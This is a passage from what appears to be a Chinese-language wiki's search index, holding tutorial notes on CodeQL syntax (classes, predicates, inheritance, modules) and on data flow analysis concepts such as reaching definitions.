\u7684\u7ed3\u679c\u5982\u4e0b:","title":"\u67e5\u8be2\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u7c7bclasses","text":"\u6211\u4eec\u53ef\u4ee5\u5728CodeQL\u4e2d\u5b9a\u4e49\u81ea\u5df1\u7684\u7c7b\u578b\uff0c\u4e00\u4e2a\u65b9\u6cd5\u662f\u5b9a\u4e49\u4e00\u4e2a\u7c7b\u3002 \u7c7b\u63d0\u4f9b\u4e86\u4e00\u79cd\u7b80\u5355\u7684\u65b9\u6cd5\u6765\u91cd\u7528\u548c\u6784\u9020\u4ee3\u7801\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5: - \u5728\u7c7b\u4e2d\u5b9a\u4e49\u6210\u5458\u8c13\u8bcd - \u5b9a\u4e49\u5b50\u7c7b\u4ee5\u91cd\u5199\u6210\u5458\u8c13\u8bcd","title":"\u7c7b(Classes)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u7c7b\u7684\u5b9a\u4e49","text":"\u5b9a\u4e49\u7c7b\u7684\u683c\u5f0f\u5982\u4e0b: class ClassName [extends Parent] { // ... } \u6ce8\u610f\u8fd9\u91cc\u6709\u4e2a\u5751\u70b9\u662f\u7c7b\u540d\u9996\u5b57\u6bcd\u5fc5\u987b\u662f\u5927\u5199\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: class OneTwoThree extends int { OneTwoThree() { // characteristic predicate this = 1 or this = 2 or this = 3 } string getAString() { // member predicate result = \"One, two or three: \" + this.toString() } predicate isEven() { // member predicate this = 2 } } \u5728CodeQL\u4e2d\uff0c\u7c7b\u5141\u8bb8\u591a\u91cd\u7ee7\u627f\uff0c\u4f46\u662f\u4ee5\u4e0b\u64cd\u4f5c\u662f\u975e\u6cd5\u7684: - \u4e0d\u80fd\u7ee7\u627f\u672c\u8eab - \u4e0d\u80fd\u7ee7\u627ffinal\u7c7b - \u4e0d\u80fd\u7ee7\u627f\u4e0d\u517c\u5bb9\u7684\u7c7b\u578b\uff0c\u8bf7\u53c2\u9605 \u7c7b\u578b\u517c\u5bb9\u6027","title":"\u7c7b\u7684\u5b9a\u4e49"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u7c7b\u7684\u4e3b\u4f53","text":"\u7c7b\u7684\u4e3b\u4f53\u53ef\u4ee5\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9 - \u4e00\u4e2a\u7279\u5f81\u8c13\u8bcd - \u4efb\u610f\u6570\u91cf\u7684\u6210\u5458\u8c13\u8bcd - \u4efb\u610f\u6570\u91cf\u7684\u5b57\u6bb5(field) \u5728\u7c7b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528this\u6765\u6307\u4ee3\u7c7b\u672c\u8eab\u3002\u5f53\u6211\u4eec\u5b9a\u4e49\u7c7b\u65f6\uff0c\u8be5\u7c7b\u8fd8\u4f1a\u4ece\u5176\u7236\u7c7b\u7ee7\u627f\u6240\u6709\u975e\u79c1\u6709\u6210\u5458\u8c13\u8bcd\u548c\u5b57\u6bb5\uff0c\u6211\u4eec\u53ef\u4ee5\u8986\u76d6(override)\u8fd9\u4e9b\u8c13\u8bcd\u548c\u5b57\u6bb5\u3002","title":"\u7c7b\u7684\u4e3b\u4f53"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u7279\u5f81\u8c13\u8bcd","text":"\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u8bed\u8a00\u4e2d\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u53ea\u80fd\u5b9a\u4e49\u4e00\u4e2a\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u7279\u5f81\u8c13\u8bcd\u4e2d\u4f7f\u7528this\u6765\u9650\u5236\u7c7b\u4e2d\u53ef\u80fd\u7684\u503c\u3002\u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0c OneTwoThree \u88ab\u9650\u5236\u4e3a1-3\u4e2d\u7684\u6574\u6570\u3002","title":"\u7279\u5f81\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u6210\u5458\u8c13\u8bcd","text":"\u8fd9\u4e9b\u8c13\u8bcd\u4ec5\u9002\u7528\u4e8e\u7c7b\u4e2d\u3002\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u53bb\u8c03\u7528\u4e0a\u8ff0\u7c7b\u7684\u6210\u5458\u8c13\u8bcd: (OneTwoThree).getAString() // \u7ed3\u679c\u662f One, two or three: 1","title":"\u6210\u5458\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u5b57\u6bb5field","text":"\u5b57\u6bb5\u662f\u5728\u7c7b\u7684\u4e3b\u9898\u4e2d\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u4e00\u4e2a\u7c7b\u7684\u4e3b\u9898\u4e2d\u53ef\u4ee5\u6709\u4efb\u610f\u6570\u91cf\u7684\u5b57\u6bb5\u58f0\u660e\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u7c7b\u4e2d\u7684\u8c13\u8bcd\u9002\u7528\u8fd9\u4e9b\u53d8\u91cf\uff0c\u7528\u6cd5\u548cthis\u7c7b\u4f3c\uff0c\u5b57\u6bb5\u5fc5\u987b\u53d7\u9650\u4e8e\u7279\u5f81\u8c13\u8bcd\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b\uff0c\u5b83\u8f93\u51fa10\u4ee5\u5185\u6bcf\u4e2a\u6570\u5b57\u7684\u9664\u6570: class SmallInt extends int { SmallInt() { this = [1 .. 10] } } class DivisibleInt extends SmallInt { SmallInt divisor; // declaration of the field `divisor` DivisibleInt() { this % divisor = 0 } SmallInt getADivisor() { result = divisor } } from DivisibleInt i select i, i.getADivisor()","title":"\u5b57\u6bb5(Field)"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u5177\u4f53\u7c7b","text":"\u4e0a\u9762\u7684\u4f8b\u5b50\u90fd\u662f\u5177\u4f53\u7c7b\uff0c\u5177\u4f53\u7c7b\u662f\u901a\u8fc7\u9650\u5236\u8f83\u5927\u7c7b\u578b\u4e2d\u7684\u503c\u6765\u5b9a\u4e49\u7684\u3002","title":"\u5177\u4f53\u7c7b"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u62bd\u8c61\u7c7b","text":"\u62bd\u8c61\u7c7b\u4f7f\u7528\u5173\u952e\u5b57 abstract \u653e\u5728\u5173\u952e\u5b57 class \u524d\u6765\u5b9a\u4e49\u3002\u62bd\u8c61\u7684\u6982\u5ff5\u76f8\u4fe1\u5728\u8bb8\u591a\u5176\u4ed6\u8bed\u8a00\u4e2d\u6211\u4eec\u90fd\u6709\u63a5\u89e6\u5230(\u4f8b\u5982java)\u3002\u62bd\u8c61\u7c7b\u6211\u4eec\u53c8\u53ef\u4ee5\u53eb\u505a\u5143\u7c7b\uff0c\u5b83\u5b9a\u4e49\u5176\u5b50\u7c7b\u7684\u8c13\u8bcd\u548c\u5b57\u6bb5\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: import go abstract class SqlExpr extends Expr { int ID; } class PostgresSqlExpr extends SqlExpr { PostgresSqlExpr(){ ID=1 } } class MySqlExpr extends SqlExpr { MySqlExpr(){ ID=2 } }","title":"\u62bd\u8c61\u7c7b"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u91cd\u5199\u6210\u5458\u8c13\u8bcd","text":"\u6211\u4eec\u4f7f\u7528\u5173\u952e\u5b57 override \u6765\u91cd\u5199\u4e00\u4e2a\u6210\u5458\u8c13\u8bcd\uff0c\u5b50\u7c7b\u91cd\u5199\u7684\u6210\u5458\u8c13\u8bcd\u4f1a\u5f71\u54cd\u7236\u7c7b\u7684\u6210\u5458\u8c13\u8bcd\u3002 \u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u6269\u5c55\u4e0a\u9762\u7684 OneTwoThree \u7c7b: class OneTwo extends OneTwoThree { OneTwo() { this = 1 or this = 2 } override string getAString() { result = \"One or two: \" + this.toString() } } \u90a3\u4e48\u5047\u5982\u6211\u4eec\u7f16\u5199\u4ee5\u4e0b\u67e5\u8be2: from OneTwoThree o select o, o.getAString() \u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0b: \u5728CodeQL\u4e2d\uff0c\u4e0e\u5176\u4ed6\u8bed\u8a00\u4e0d\u540c\uff0c\u76f8\u540c\u7236\u7c7b\u7684\u5b50\u7c7b\u4e0d\u4f1a\u4e92\u76f8\u51b2\u7a81\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2aTwoThree\uff0c\u5b83\u540c\u6837\u7ee7\u627f\u4e8e OneTwoThree \uff0c\u5b83\u7684\u7279\u5f81\u8c13\u8bcd\u7684\u4e00\u90e8\u5206\u4e0e OneTwo \u91cd\u53e0\u3002 class TwoThree extends OneTwoThree { TwoThree() { this = 2 or this = 3 } override string getAString() { result = \"Two or three: \" + this.toString() } } \u73b0\u5728\u6574\u65702\u65e2\u662f TwoThree \u4e5f\u662f OneTwo \u7684\u7279\u5f81\uff0c\u8fd9\u4e24\u4e2a\u7c7b\u90fd\u8986\u76d6\u4e86\u539f\u59cb\u7236\u7c7b\u7684\u6210\u5458\u8c13\u8bcd getAString \uff0c\u90a3\u4e48\u6211\u4eec\u91cd\u65b0\u6267\u884c\u4e0a\u8ff0\u67e5\u8be2\uff0c\u5728\u9047\u52302\u65f6\u4f1a\u5f97\u52302\u4e2a\u7ed3\u679c:","title":"\u91cd\u5199\u6210\u5458\u8c13\u8bcd"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u591a\u91cd\u7ee7\u627f","text":"\u5728CodeQL\u4e2d\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u7ee7\u627f\u591a\u4e2a\u7c7b\u578b\uff0c\u4f8b\u5982: class Two extends OneTwo, TwoThree {} \u8fd9\u4e2a\u7c7b Two \u540c\u65f6\u7ee7\u627f\u4e86 OneTwo \u548c TwoThree \uff0c\u5b83\u8fd8\u95f4\u63a5\u7ee7\u627f\u81ea OneTwoThree \u548c int \uff0c\u90a3\u4e48\u901a\u8fc7\u7279\u5f81\u8c13\u8bcd\u6211\u4eec\u77e5\u9053\u5176\u503c\u53ea\u80fd\u662f2\u3002 \u5982\u679c\u4e00\u4e2a\u5b50\u7c7b\u7ee7\u627f\u4e86\u540c\u4e00\u4e2a\u8c13\u8bcd\u7684\u591a\u4e2a\u5b9a\u4e49\uff0c\u90a3\u4e48\u8be5\u7c7b\u8fd8\u9700\u8981\u624b\u52a8\u91cd\u5199\u8be5\u8c13\u8bcd\u4ee5\u907f\u514d\u6b67\u4e49\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 super \u8868\u8fbe\u5f0f\uff0c\u4f8b\u5982: class Two extends OneTwo, TwoThree { override string getAString() { result = TwoThree.super.getAString() } } ### \u975e\u7ee7\u627f\u5b50\u7c7b(Non-extending subtypes) \u9664\u4e86\u4f7f\u7528\u5173\u952e\u5b57 extends \u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528 instanceof \u6765\"\u7ee7\u627f\"\u7236\u7c7b\uff0c\u5c06\u4e00\u4e2a\u7c7b\u58f0\u660e\u4e3a instanceof Foo \u5927\u81f4\u7b49\u4ef7\u4e8e\u5728\u7279\u5f81\u8c13\u8bcd\u4e2d\u58f0\u660e\u4e86 this instanceof Foo \uff0c\u4e3b\u8981\u7684\u533a\u522b\u662f\u5176\u53ef\u4ee5\u901a\u8fc7super\u6765\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4f7f\u7528\u5173\u952e\u5b57 instanceof \"\u7ee7\u627f\"\u7236\u7c7b\u65f6\uff0c\u4f7f\u7528 override \u5173\u952e\u5b57\u91cd\u5199\u6210\u5458\u8c13\u8bcd\u4e0d\u4f1a\u5bf9\u7236\u7c7b\u9020\u6210\u5f71\u54cd\u3002 ## \u6a21\u5757(Modules) \u6a21\u5757\u63d0\u4f9b\u4e86\u4e00\u79cd\u901a\u8fc7\u5c06\u76f8\u5173\u7c7b\u578b\u3001\u8c13\u8bcd\u548c\u5176\u4ed6\u6a21\u5757\u7ec4\u5408\u5728\u4e00\u8d77\u6765\u7ec4\u7ec7 QL \u4ee3\u7801\u7684\u65b9\u6cd5\u3002 \u6211\u4eec\u53ef\u4ee5\u5c06\u6a21\u5757\u5bfc\u5165\u5230\u5176\u4ed6\u6587\u4ef6\u4e2d\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u91cd\u590d\uff0c\u5e76\u6709\u52a9\u4e8e\u4ee3\u7801\u7ba1\u7406\u3002 ### \u6a21\u5757\u4e3b\u4f53 \u6a21\u5757\u4e2d\u5141\u8bb8\u5305\u542b\u4ee5\u4e0b\u7684\u7ed3\u6784: - \u5bfc\u5165\u6a21\u5757\u8bed\u53e5 - \u8c13\u8bcd - \u7c7b\u578b - \u522b\u540d - \u663e\u5f0f\u6a21\u5757 - select\u5b50\u53e5(\u4ec5\u53ef\u5728\u67e5\u8be2\u6a21\u5757\u4e2d\u4f7f\u7528) ### \u5b9a\u4e49\u6a21\u5757 \u76f4\u63a5\u4f7f\u7528\u5173\u952e\u5b57 module \u6765\u663e\u5f0f\u5b9a\u4e49\u4e00\u4e2a\u6a21\u5757\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50(example.qll)\u5982\u4e0b: ``ql module Example { class OneTwoThree extends int { OneTwoThree() { this = 1 or this = 2 or this = 3 } } } ### \u5bfc\u5165\u6a21\u5757 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5173\u952e\u5b57`import`\u5bfc\u5165\u6a21\u5757\uff0c\u8fd9\u4f1a\u5c06\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u6240\u6709\u540d\u79f0(\u9664\u79c1\u6709\u540d\u79f0\u5916)\u90fd\u5bfc\u5165\u5f53\u524d\u6a21\u5757\u7684\u547d\u540d\u7a7a\u95f4\u91cc\uff0c\u5bfc\u5165\u6a21\u5757\u8bed\u53e5\u7684\u5f62\u5f0f\u5982\u4e0b: ```ql import <module_expression1> as <name> import <module_expression2> \u8fd9\u76f8\u5f53\u4e8epython\u4e2d\u7684 from import *`","title":"\u591a\u91cd\u7ee7\u627f"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u6a21\u5757\u79cd\u7c7b","text":"","title":"\u6a21\u5757\u79cd\u7c7b"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u6587\u4ef6\u6a21\u5757","text":"\u6bcf\u4e2a\u67e5\u8be2\u6587\u4ef6(.ql)\u6216\u5e93\u6587\u4ef6(.qll)\u90fd\u9690\u5f0f\u5730\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6a21\u5757\uff0c\u5176\u6a21\u5757\u540d\u4e0e\u6587\u4ef6\u540c\u540d\uff0c\u4f46\u6587\u4ef6\u4e2d\u7684\u4efb\u4f55\u7a7a\u683c\u90fd\u88ab\u8f6c\u6362\u4e3a\u4e0b\u5212\u7ebf","title":"\u6587\u4ef6\u6a21\u5757"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u5e93\u6a21\u5757","text":"\u5e93\u6a21\u5757\u7531.qll\u6587\u4ef6\u5b9a\u4e49\uff0c\u5b83\u53ef\u4ee5\u5305\u542b\u9664\u4e86select\u5b57\u53e5\u4e4b\u5916\u7684\u6a21\u5757\u4e3b\u4f53\u3002","title":"\u5e93\u6a21\u5757"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u67e5\u8be2\u6a21\u5757","text":"\u5e93\u6a21\u5757\u5b58\u5728\u4e8e\u5e93\u6587\u4ef6(.qll)\u4e2d\uff0c\u5b83\u53ef\u4ee5\u5305\u542b\u9664\u4e86select\u5b57\u53e5\u4e4b\u5916\u7684\u6a21\u5757\u4e3b\u4f53\u3002 \u67e5\u8be2\u6a21\u5757\u7531.ql\u6587\u4ef6\u5b9a\u4e49\u3002\u5b83\u53ef\u4ee5\u5305\u542b\u4ee5\u4e0b\u6a21\u5757\u4e3b\u4f53\u4e2d\u5217\u51fa\u7684\u4efb\u4f55\u5143\u7d20\u3002 \u67e5\u8be2\u6a21\u5757\u4e0e\u5176\u4ed6\u6a21\u5757\u7a0d\u6709\u4e0d\u540c: - \u65e0\u6cd5\u5bfc\u5165\u5176\u4ed6\u67e5\u8be2\u6a21\u5757 - \u4e00\u4e2a\u67e5\u8be2\u6a21\u5757\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u67e5\u8be2\uff0c\u5b83\u53ef\u4ee5\u662fselect\u8bed\u53e5\u6216\u8005\u4e00\u4e2a\u67e5\u8be2\u8c13\u8bcd","title":"\u67e5\u8be2\u6a21\u5757"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/#\u663e\u5f0f\u6a21\u5757","text":"\u6211\u4eec\u8fd8\u53ef\u4ee5\u5728\u4e00\u4e2a\u6a21\u5757\u4e2d\u663e\u5f0f\u5730\u5b9a\u4e49\u53e6\u5916\u4e00\u4e2a\u6a21\u5757\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e0a\u8ff0\u7684\u4f8b\u5b50(example.qll)\u4e2d\u518d\u5b9a\u4e49\u4e00\u4e2a\u6a21\u5757\uff0c\u4f8b\u5b50\u5982\u4e0b: ... module M { class OneTwo extends OneTwoThree { OneTwo() { this = 1 or this = 2 } } }","title":"\u663e\u5f0f\u6a21\u5757"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/codeql/","text":"codeql Overview # type: folder_brief_live noteOnly: true style: strip","title":"codeql Overview"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/codeql/#codeql-overview","text":"type: folder_brief_live noteOnly: true style: strip","title":"codeql Overview"},{"location":"%E5%AE%89%E5%85%A8/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/","text":"Data Flow Analysis - Applications # overview # Overview of Data Flow Analysis # Over- and under-approximations are both for safety of analysis (\u8fd9\u4e24\u79cd\u8fd1\u4f3c\u90fd\u662f\u5bf9\u4e8e\u5206\u6790\u6765\u8bf4\u90fd\u662fsafety\u7684) may analysis / over-approximation # outputs information that may be true, it works for most static analyses (\u8f93\u51fa\u7684\u4fe1\u606f\u53ef\u80fd\u662f\u6b63\u786e\u7684\uff0c\u5b83\u9002\u7528\u4e8e\u7edd\u5927\u591a\u6570\u7684\u9759\u6001\u5206\u6790) must analysis / under-approximation # outputs information that must be true (\u8f93\u51fa\u7684\u4fe1\u606f\u5fc5\u987b\u662f\u6b63\u786e\u7684) for example # different data-flow analysis applications have different data abstraction and different flow safe-approximation strategies, i.e., different transfer functions and control-flow handlings (\u4e0d\u540c\u7684\u6570\u636e\u6d41\u5206\u6790\u6709\u4e0d\u540c\u7684\u6570\u636e\u62bd\u8c61\uff0c\u4e0d\u540c\u7684flow safe-approximation\uff0c\u4e0d\u540c\u7684\u8f6c\u6362\u51fd\u6570\u548c\u4e0d\u540c\u7684\u63a7\u5236\u6d41\u5904\u7406) \u4ee5\u7b2c\u4e00\u8282\u8bfe\u7684\u7b26\u53f7\u9759\u6001\u5206\u6790\u4e3a\u4f8b(\u5373\u5206\u6790\u53d8\u91cf\u7684\u7b26\u53f7\u4e3a\u6b63\uff0c\u8d1f\uff0c\u96f6\uff0c\u672a\u77e5\uff0c\u8fd8\u662f\u672a\u5b9a\u4e49) 1. \u8fd9\u91cc\u7684application-specific Data\u4e3a\u6211\u4eec\u5173\u6ce8\u7684\u7b26\u53f7 2. \u8fd9\u91cc\u7684transfer function\u4e3a\u7b26\u53f7\u8fd0\u7b97\u89c4\u5219(\u5982\u6b63\u6b63\u5f97\u6b63\uff0c\u6b63\u8d1f\u5f97\u8d1f) 3. \u8fd9\u91cc\u7684control-flow handling\u4e3a\u5c06\u8fd9\u4e9b\u7b26\u53f7\u5408\u5e76\u8d77\u6765\uff0c\u5f97\u5230\u7b26\u53f7\u53ef\u80fd\u7684\u7ed3\u679c three key points # Abstract application-specific Data(\u62bd\u8c61\u51fa\u6211\u4eec\u5173\u6ce8\u7684\u6570\u636e) Describe transfer function(\u63cf\u8ff0\u8f6c\u6362\u51fd\u6570) Control-flow handling(\u5904\u7406\u63a7\u5236\u6d41) Preliminaries of Data Flow Analysis # Input and Output States # Each execution of an IR statement transforms an input state to a new output state(\u6bcf\u4e2a\u8bed\u53e5\u7684\u6267\u884c\u90fd\u4f1a\u5c06\u4e00\u4e2ainput\u72b6\u6001\u8f6c\u6362\u4e3a\u4e00\u4e2a\u65b0\u7684output\u72b6\u6001) The input (output) state is associated with the program point before (after) the statement (Input/output\u72b6\u6001\u662f\u4e0e\u8bed\u53e5\u6267\u884c\u524d/\u540e\u7684\u7a0b\u5e8f\u70b9\u76f8\u5173\u8054\u7684) In each data-flow analysis application, we associate with every program point a data-flow value that represents an abstraction of the set of all possible program states that can be observed for that point.(\u5728\u6bcf\u4e2a\u6570\u636e\u6d41\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u5c06\u6bcf\u4e2a\u7a0b\u5e8f\u70b9\u4e0e\u4e00\u4e2a\u6570\u636e\u6d41\u503c\u5173\u8054\u8d77\u6765\uff0c\u8fd9\u4e2a\u6570\u636e\u6d41\u503c\u8868\u793a\u53ef\u4ee5\u89c2\u5bdf\u5230\u7684\u6240\u6709\u53ef\u80fd\u7684\u7a0b\u5e8f\u72b6\u6001\u96c6\u7684\u62bd\u8c61) The set of possible dataflow values is the domain for this application(\u53ef\u80fd\u7684\u6570\u636e\u6d41\u503c\u96c6\u662f\u6b64\u5e94\u7528\u7a0b\u5e8f\u7684\u57df) Data-flow analysis is to find a solution to a set of safe-approximationdirected constraints on the IN[s]\u2019s and OUT[s]\u2019s, for all statements.(\u6570\u636e\u6d41\u5206\u6790\u5c31\u662f\u4e3a\u6240\u6709\u8bed\u53e5\u7684IN\u548cOUT\u627e\u5230\u4e00\u7ec4safe-approximationdirected\u7684\u7ea6\u675f\u7684\u89e3\u51b3\u65b9\u6848) constraints based on semantics of statements (transfer functions) (\u7ea6\u675f\u57fa\u4e8e\u8bed\u53e5\u8bed\u4e49) constraints based on the flows of control (\u7ea6\u675f\u57fa\u4e8e\u63a7\u5236\u6d41) \u8fd8\u662f\u4ee5\u7b2c\u4e00\u8282\u8bfe\u7684\u7b26\u53f7\u9759\u6001\u5206\u6790\u4e3a\u4f8b: - \u6211\u4eec\u5173\u6ce8\u7684\u662f\u7b26\u53f7\uff0c\u6240\u4ee5\u6b64\u5e94\u7528\u7a0b\u5e8f\u7684\u57df\u5c31\u4e3a\u8fd9\u51e0\u4e2a\u7b26\u53f7 - \u5728\u6bcf\u6b21\u8bed\u53e5\u6267\u884c\u540e\uff0c\u6211\u4eec\u5173\u6ce8\u6b64\u7a0b\u5e8f\u70b9\u7684\u53d8\u91cf(x,y)\u7684\u6240\u6709\u53ef\u80fd\u7b26\u53f7 Notations for Transfer Function\u2019s Constraints # Forward Analysis(\u6b63\u5411\u5206\u6790) Backward Analysis(\u53cd\u5411\u5206\u6790) Notations for Control Flow\u2019s Constraints # The meet operator ^ is used to summarize the contributions from different paths at the confluence of those paths (\u4ea4\u8fd0\u7b97\u7b26 ^ \u662f\u7528\u4e8e\u6c47\u603b\u4e0d\u540c\u8def\u5f84\u5728\u6c47\u5408\u5904\u7684\u7ed3\u679c) Reaching Definitions # A definition d at program point p reaches a point q if there is a path from p to q such that d is not \u201ckilled\u201d along that path(\u53ef\u8fbe\u5b9a\u4e49\u5206\u6790\u5c31\u662f\u6307\u4e00\u4e2a\u5b9a\u4e49d\u5728\u7a0b\u5e8f\u70b9p\u80fd\u5426\u5230\u8fbe\u7a0b\u5e8f\u70b9q\uff0c\u5373\u662f\u5426\u5b58\u5728\u4e00\u6761\u4ecep\u5230q\u4e14\u5728\u9014\u4e2dd\u6ca1\u88ab\u6740\u6b7b\u7684\u8def\u5f84) - A definition of a variable v is a statement that assigns a value to v(\u53d8\u91cf v \u7684\u5b9a\u4e49\u662f\u4e00\u4e2a\u7ed9v\u8d4b\u503c\u7684\u8bed\u53e5) - Translated as: definition of variable v at program point p reaches point q if there is a path from p to q such that no new definition of v appears on that path(\u6362\u53e5\u8bdd\u8bf4: \u5982\u679c\u5b58\u5728\u4ece p \u5230 q \u7684\u8def\u5f84\uff0c\u4f7f\u5f97\u5728\u8fd9\u6761\u8def\u5f84\u4e0a\u4e0d\u4f1a\u51fa\u73b0\u65b0\u7684 v \u7684\u5b9a\u4e49\uff0c\u5219\u5b9a\u4e49d\u53ef\u4ecep\u62b5\u8fbeq) - Reaching definitions can be used to detect possible undefined variables. e.g., introduce a dummy definition for each variable v at the entry of CFG, and if the dummy definition of v reaches a point p where v is used, then v may be used before definition (as undefined reaches v) (\u53ef\u4ee5\u4f7f\u7528\u53ef\u8fbe\u5b9a\u4e49\u5206\u6790\u53ef\u80fd\u7684\u672a\u5b9a\u4e49\u53d8\u91cf\u3002\u4f8b\u5982\uff0c\u5728 CFG \u7684\u5165\u53e3\u5904\u4e3a\u6bcf\u4e2a\u53d8\u91cf v \u5f15\u5165\u4e00\u4e2a\u865a\u62df\u5b9a\u4e49\uff0c\u5982\u679c v \u7684\u865a\u62df\u5b9a\u4e49\u8fbe\u5230\u4e00\u4e2a\u70b9 p\uff0c\u90a3\u4e48v\u53ef\u80fd\u5728\u5b9a\u4e49\u4e4b\u524d\u4f7f\u7528) Understanding Reaching Definitions # \u6211\u4eec\u9700\u8981\u5bf9\u6211\u4eec\u5173\u6ce8\u7684\u6570\u636e\u8fdb\u884c\u62bd\u8c61\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u7684\u662f\u6240\u6709\u53d8\u91cf\u7684\u5b9a\u4e49\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6bd4\u7279\u6d41\u6765\u8868\u793a\uff0c\u6bd4\u5982D1\uff0cD2\uff0cD3\uff0cD4\uff0c...\uff0cD100\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a100\u4f4d\u7684\u6bd4\u7279\u6d41\u6765\u8868\u793a\uff0c\u4ece\u5de6\u6570\u7b2ci\u4e2aBit\u4ee3\u8868\u7b2ci\u4e2a\u5b9a\u4e49\u662f\u5426\u53ef\u5230\u8fbe(0\u4e3a\u4e0d\u53ef\u8fbe\uff0c1\u4e3a\u53ef\u8fbe) \u4ee5\u4e00\u4e2a\u6211\u4eec\u5173\u6ce8\u7684\uff0c\u7b80\u5355\u7684\u5b9a\u4e49\u8bed\u53e5\u4e3a\u4f8b\uff0c\u8fd9\u6761\u5b9a\u4e49\u8bed\u53e5D\u5b9a\u4e49\u4e86\u53d8\u91cfv\u5e76\u4e14\u6740\u6b7b\u4e86\u5728\u7a0b\u5e8f\u4e2d\u5176\u4ed6\u5b9a\u4e49v\u7684\u8bed\u53e5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5199\u51fa: - transfer function: OUT[B] = genB U (IN[B] - killB) \u8fd9\u91cc\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u7528\u4e8e\u7406\u89e3transfer function A definition reaches a program point as long as there exists at least one path along which the definition 